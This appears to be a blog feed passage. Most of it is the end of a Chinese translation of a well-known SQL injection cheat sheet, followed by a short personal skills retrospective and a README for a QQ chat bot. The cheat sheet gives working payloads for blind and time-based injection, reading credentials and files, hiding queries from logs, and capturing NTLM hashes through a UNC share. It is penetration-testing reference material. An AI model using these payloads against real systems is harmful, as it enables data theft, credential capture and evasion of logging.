<p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p>

<h3 id="toc_50">盲注</h3>

<h4 id="toc_51">关于盲注</h4>

<p>一个经过完整而优秀开发的应用一般来说你是<strong>看不到错误提示的</strong>，所以你是没办法从Union攻击和错误中提取出数据的</p>

<p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p>

<p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p>

<p>在一般盲注下你能够使用<strong>If语句</strong>或者<strong>WHERE查询注入</strong><em>(一般来说比较简单)</em>，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用<strong>WAIT FOR DELAY &lsquo;0:0:10&rsquo;</strong>，在MySQL中使用<strong>BENCHMARK()</strong>，在PostgreSQL中使用<strong>pg_sleep(10)</strong>，以及在ORACLE中的一些<strong>PL/SQL小技巧</strong>。</p>

<h4 id="toc_52">实战中的盲注实例</h4>

<p>以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p>

<p><strong>TRUE</strong>和<strong>FALSE</strong>标志代表了查询返回了true或false</p>

<pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83-- 

TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80-- 

FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
</code></pre>

<p>由于上面<strong>后两个查询都是false</strong>，我们能清楚的知道表名的第一个<strong>字符的ASCII码是80，也就是&quot;P&rdquo;</strong>。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。</p>

<h3 id="toc_53">延时盲注</h3>

<p>首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。</p>

<h4 id="toc_54"><code>WAITFOR DELAY [time]</code>(S)</h4>

<p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p>

<p><code>WAITFOR DELAY &#39;0:0:10&#39;--</code></p>

<p>你也可以这样用</p>

<p><code>WAITFOR DELAY &#39;0:0:0.51&#39;</code></p>

<h4 id="toc_55">实例</h4>

<ul>
<li>俺是sa吗？
<code>if (select user) = &#39;sa&#39; waitfor delay &#39;0:0:10&#39;</code></li>
<li>ProductID =<code>1;waitfor delay &#39;0:0:10&#39;--</code></li>
<li>ProductID =<code>1);waitfor delay &#39;0:0:10&#39;--</code></li>
<li>ProductID =<code>1&#39;;waitfor delay &#39;0:0:10&#39;--</code></li>
<li>ProductID =<code>1&#39;);waitfor delay &#39;0:0:10&#39;--</code></li>
<li>ProductID =<code>1));waitfor delay &#39;0:0:10&#39;--</code></li>
<li>ProductID =<code>1&#39;));waitfor delay &#39;0:0:10&#39;--</code></li>
</ul>

<h4 id="toc_56"><code>BENCHMARK()</code>(M)</h4>

<p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。<br/>
<code>BENCHMARK(howmanytimes, do this)</code></p>

<h4 id="toc_57">实例</h4>

<ul>
<li><p>俺是root吗？爽！<br/>
<code>IF EXISTS (SELECT * FROM users WHERE username = &#39;root&#39;) BENCHMARK(1000000000,MD5(1))</code></p></li>
<li><p>判断表是否存在<br/>
<code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></p></li>
</ul>

<h4 id="toc_58"><code>pg_sleep(seconds)</code>(P)</h4>

<p>睡眠指定秒数。</p>

<ul>
<li><code>SELECT pg_sleep(10);</code>睡个十秒</li>
</ul>

<h3 id="toc_59">掩盖痕迹</h3>

<h4 id="toc_60"><code>-sp_password log bypass</code>(S)</h4>

<p>出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p>

<h3 id="toc_61">注入测试</h3>

<p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p>

<ol>
<li><p><code>product.asp?id=4 (SMO)</code></p>

<ol>
<li><code>product.asp?id=5-1</code></li>
<li><code>product.asp?id=4 OR 1=1</code></li>
</ol></li>
<li><p><code>product.asp?name=Book</code></p>

<ol>
<li><code>product.asp?name=Bo’%2b’ok</code></li>
<li><code>product.asp?name=Bo’ || ’ok (OM)</code></li>
<li><code>product.asp?name=Book’ OR ‘x’=’x</code></li>
</ol></li>
</ol>

<h3 id="toc_62">一些其他的MySQL笔记</h3>

<ul>
<li>子查询只能在MySQL4.1+使用</li>
<li>用户

<ul>
<li><code>SELECT User,Password FROM mysql.user;</code></li>
</ul></li>
<li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=&#39;2&#39;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></li>
<li><code>SELECT ... INTO DUMPFILE</code>

<ul>
<li>把查询写入一个<strong>新文件</strong>中(不能修改已有文件)</li>
</ul></li>
<li>UDF功能

<ul>
<li><code>create function LockWorkStation returns integer soname &#39;user32&#39;;</code></li>
<li><code>select LockWorkStation();</code></li>
<li><code>create function ExitProcess returns integer soname &#39;kernel32&#39;;</code></li>
<li><code>select exitprocess();</code></li>
</ul></li>
<li><code>SELECT USER();</code></li>
<li><code>SELECT password,USER() FROM mysql.user;</code></li>
<li>admin密码哈希的第一位

<ul>
<li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li>
</ul></li>
<li>文件读取

<ul>
<li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li>
</ul></li>
<li><p>MySQL读取文件内容</p>

<ul>
<li><p><strong>默认这个功能是没开启的！</strong></p>

<pre><code>create table foo( line blob ); 
load data infile &#39;c:/boot.ini&#39; into table foo; 
select * from foo;
</code></pre></li>
</ul></li>
<li><p>MySQL里的各种延时</p></li>
<li><p><code>select benchmark( 500000, sha1( &#39;test&#39; ) );<br/>
query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></p></li>
<li><p><code>select if( user() like &#39;root@%&#39;, benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; );</code></p></li>
<li><p><strong>遍历数据，暴力猜解</strong></p>

<ul>
<li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; );</code></li>
</ul></li>
</ul>

<h4 id="toc_63">MySQL中好用的函数</h4>

<ul>
<li><p><code>MD5()</code></p>

<p>MD5哈希</p></li>
<li><p><code>SHA1()</code> </p>

<p>SHA1哈希</p></li>
<li><p><code>PASSWORD()</code></p></li>
<li><p><code>ENCODE()</code></p></li>
<li><p><code>COMPRESS()</code> </p>

<p>压缩数据，在盲注时读取大量数据很好用</p></li>
<li><p><code>ROW_COUNT()</code></p></li>
<li><p><code>SCHEMA()</code></p></li>
<li><p><code>VERSION()</code></p>

<p>跟<code>@@version</code>是一样的</p></li>
</ul>

<h3 id="toc_64">SQL注入的高级使用</h3>

<p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p>

<blockquote>
<p>Name:<code>&#39; + (SELECT TOP 1 password FROM users ) + &#39;</code></p>

<p>Email : <code>xx@xx.com</code></p>
</blockquote>

<p>如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。</p>

<h4 id="toc_65">强制SQL Server来得到NTLM哈希</h4>

<p>这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。</p>

<h4 id="toc_66">Bulk insert UNC共享文件 (S)</h4>

<p><code>bulk insert foo from &#39;\\YOURIPADDRESS\C$\x.txt&#39;</code></p>

<h2 id="toc_67">参考资料</h2>

<p>因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件</a><em>(ferruh-at-mavituna.com)</em>，我会尽快更新。</p>

<ul>
<li><strong>各种资料</strong>

<ul>
<li><a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
<li><a href="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">More Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
<li><a href="http://www.imperva.com/download.asp?id=4">Blindfolded SQL Injection, Ofer Maor</a> – <em>Amichai Shulman</em></li>
<li><a href="http://www.ngssoftware.com/papers/HackproofingMySQL.pdf">Hackproofing MySQL</a>, <em>Chris Anley</em></li>
<li><a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html">Database Hacker&rsquo;s Handbook, David Litchfield</a>, <em>Chris Anley, John Heasman, Bill Grindlay</em></li>
<li><strong>楼上的团队</strong>！</li>
</ul></li>
<li><strong>MSSQL相关</strong>

<ul>
<li>MSSQL Operators - <a href="http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx</a></li>
<li>Transact-SQL Reference - <a href="http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx</a></li>
<li>String Functions (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms181984.aspx">http://msdn2.microsoft.com/en-us/library/ms181984.aspx</a></li>
<li>List of MSSQL Server Collation Names - <a href="http://msdn2.microsoft.com/en-us/library/ms180175.aspx">http://msdn2.microsoft.com/en-us/library/ms180175.aspx</a></li>
<li>MSSQL Server 2005 Login Information and some other functions : <a href="http://www.notsosecure.com/">Sumit Siddharth</a></li>
</ul></li>
<li><strong>MySQL相关</strong>

<ul>
<li>Comments : <a href="http://dev.mysql.com/doc/">http://dev.mysql.com/doc/</a></li>
<li>Control Flows - <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html">http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html</a></li>
<li>MySQL Gotchas - <a href="http://sql-info.de/mysql/gotchas.htm">http://sql-info.de/mysql/gotchas.htm</a></li>
<li><a href="http://www.securiteam.com/securityreviews/5KP0N1PC1W.html">New SQL Injection Concept</a>, <em>Tonu Samuel</em></li>
</ul></li>
</ul>

<h2 id="toc_68">更新日志</h2>

<ul>
<li>15/03/2007 - Public Release v1.0</li>
<li>16/03/2007 - v1.1

<ul>
<li>Links added for some paper and book references</li>
<li>Collation sample added</li>
<li>Some typos fixed</li>
<li>Styles and Formatting improved</li>
<li>New MySQL version and comment samples</li>
<li>PostgreSQL Added to Ascii and legends, pg_sleep() added blind section</li>
<li>Blind SQL Injection section and improvements, new samples</li>
<li>Reference paper added for MySQL comments</li>
</ul></li>
<li>21/03/2007 - v1.2

<ul>
<li>BENCHMARK() sample changed to avoid people DoS their MySQL Servers</li>
<li>More Formatting and Typo</li>
<li>Descriptions for some MySQL Function</li>
</ul></li>
<li>30/03/2007 v1.3

<ul>
<li>Niko pointed out PotsgreSQL and PHP supports stacked queries</li>
<li>Bypassing second MD5 check login screens description and attack added</li>
<li>Mark came with extracting NTLM session idea, added</li>
<li>Detailed Blind SQL Exploitation added</li>
</ul></li>
<li>13/04/2007 v1.4 - Release

<ul>
<li>SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)</li>
<li><a href="http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html">日文版SQL注入速查表发布</a> (<em>v1.1</em>)</li>
</ul></li>
</ul>

<h3 id="toc_69">待办事项 / 联系方式 / 帮助</h3>

<p>我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件吧</a><em>(ferruh-at-mavituna.com)</em></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[个人总结]]></title>
    <link href="http://yinzo.github.io/14608289034158.html"/>
    <updated>2016-04-17T01:48:23+08:00</updated>
    <id>http://yinzo.github.io/14608289034158.html</id>
    <content type="html"><![CDATA[
<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffgw1euglbmesppj217w0kkqbc.jpg" alt="技能树——2015.07.26"/>只有把自己的技能都列出来的时候才能发现自己是有多么的弱。希望以后能有一份拿得出手的技能树，就放在这张旧的旁边。</p>

<p>记录一下技能树里面的具体内容：</p>

<h2 id="toc_0">小学</h2>

<ul>
<li>瞎玩Flash</li>
</ul>

<h2 id="toc_1">初中</h2>

<ul>
<li>VB自学，初二——高一

<ul>
<li>当时在玩无损，写了个cue文件批量修改与格式化的小软件</li>
</ul></li>
</ul>

<h2 id="toc_2">高中</h2>

<ul>
<li>C#自学，高二——高三

<ul>
<li>高三用C#做出一个舒尔特表格的3×3与5×5版本</li>
</ul></li>
<li>入门Ubuntu</li>
</ul>

<span id="more"></span><!-- more -->

<h2 id="toc_3">高中毕业至大学入学的暑假</h2>

<ul>
<li>自学HTML/CSS/PHP/JavaScript/MySQL</li>
<li>转到Mac平台</li>
<li>建立第一个WordPress博客，自行修改主题。</li>
<li>写出第一个基于JavaScript的小东西：Spin!</li>
<li>一个星期自学JQuery并完成舒尔特表格JS版</li>
<li>入门Python，写出第一个POC，遍历14级新生信息</li>
<li>自学计算机网络</li>
</ul>

<h2 id="toc_4">大一</h2>

<ul>
<li>课程学习C++，高分过</li>
<li>水了几次CTF，入门了XSS、了解了CSRF、用工具日了几个SQL注入，成功shell</li>
<li>入手Linode1024</li>
<li>使用Django+MySQL完整搭出个人博客</li>
<li>完成学生信息查询系统</li>
<li>为了更便捷的科学上网以及充分利用VPS，搭建Shadowsocks</li>
<li>完成编写SmartQQ-Bot初版</li>
<li>参加（水）华为杯大学生智能大赛，入门机器学习</li>
<li>完成SmartQQ-Bot失物招领版本</li>
<li>C++课程设计，独立使用MySQL+Qt完成数据库+界面，高分过</li>
<li>基本完成SmartQQ-Bot框架的开发</li>
<li>学习《啊哈！算法》</li>
</ul>

<p>现在我在用的好多技能，都还是高三毕业那个两个月的暑假学出来的，当时我的效率简直吓哭，比高三那时候疯的多了，一个星期自学完计算机网络什么的现在简直不敢想，3个小时就坐不住了。</p>

<p>之前放假之前说好的完成TODO_list，现在也就搞了搞SmartQQBot框架跟深入Python，效率不堪直视。嗯现在归纳个人技能表也算做好了:D。</p>

<p>之后几天内差不多该回学校了，一堆一堆的书都等着我呢;P</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[基于SmartQQ的Python QQ机器人框架]]></title>
    <link href="http://yinzo.github.io/14608289253115.html"/>
    <updated>2016-04-17T01:48:45+08:00</updated>
    <id>http://yinzo.github.io/14608289253115.html</id>
    <content type="html"><![CDATA[
<p>项目地址：<a href="https://github.com/Yinzo/SmartQQBot">https://github.com/Yinzo/SmartQQBot</a></p>

<p>这是一个原本是自己在看到某一个QQ群中的机器人后，以娱乐的心态写的一个QQ机器人。登陆部分逻辑与代码参考了<a href="https://github.com/xqin/SmartQQ-for-Raspberry-Pi">原名：SmartQQ-for-Raspberry-Pi(PiWebQQV2)</a>这一项目，结合自己的需求写出来的一个以娱乐为主的小玩具。</p>

<p>习惯性地把自己写的小东西发布到Github，意外地发现受到了一定的支持。加上在进一步开发失物招领功能的时候发现代码逻辑有点混乱，于是决定进行一次完全的重构，希望能够开发出一个便于二次开发的QQ机器人框架。</p>

<p>以下为没有重构之前的机器人的README，但是近期（两到三个星期）机器人就将重构，所以以下内容可能会马上过时。</p>

<span id="more"></span><!-- more -->

<hr/>

<h2 id="toc_0">如何使用</h2>

<ul>
<li><code>python QQBot.py</code></li>
<li>等待提示“登陆二维码下载成功，请扫描”，打开脚本所在目录的v.jpg图片扫描二维码。</li>
<li>等待登陆成功的提示
&lt;!&ndash;+ 登陆成功后出现&quot;&gt;&gt;&ldquo;表示可输入命令，此时私聊问答功能自动激活，群聊各功能需要手动关注该群才会激活，关注群的命令为<code>group 群号</code>，此命令为控制台命令，不是在qq中发送。&ndash;&gt;</li>
<li>修改config文件夹中的QQBot_default.conf配置文件</li>
<li>群聊各功能需要在groupCheckList中添加群号，每行一个，来关注群以激活群功能。</li>
</ul>

<h2 id="toc_1">功能</h2>

<p><small>注：以下命令皆是在qq中发送，群聊命令发送到所在群中</small></p>

<ul>
<li><p>群聊学习功能，类似于小黄鸡，在群中通过发送<code>!learn {ha}{哈哈}</code>语句，则机器人检测到发言中包含“ha”时将自动回复“哈哈”。<code>!delete {ha}{哈哈}</code>可以删除该内容。学习内容会自动储存在<code>groupReplys</code>目录中群号.save文件</p></li>
<li><p>群聊复读功能，检测到群聊中<strong><em>连续两个</em></strong>回复内容相同，将自动复读该内容1次。</p></li>
<li><p>群聊关注功能，使用命令<code>!follow qq号</code>可以使机器人复读此人所有发言（除命令外）使用命令<code>!unfollow qq号</code>解除关注。qq号处可使用&quot;me&quot;来快速关注与解除关注自己，例：<code>!follow me</code></p></li>
<li><p>私聊问答功能，可以自定义机器人私聊时提出问题，并可储存对方的回复，一般用于自动问卷调查。</p></li>
</ul>

<h2 id="toc_2">TODO</h2>

<ul>
<li>logging模块优化分离，保证主程序无任何print输出。私聊与群消息提醒使用单独的文件输出。</li>
<li>细化配置项（tucao_auth = (all/self/custom/none)）</li>
<li>tucao内容储存优化，使用cPickle库<br/></li>
<li>工程模块化重构</li>
<li>群成员外号表</li>
</ul>

]]></content>
  </entry>
  
</feed>
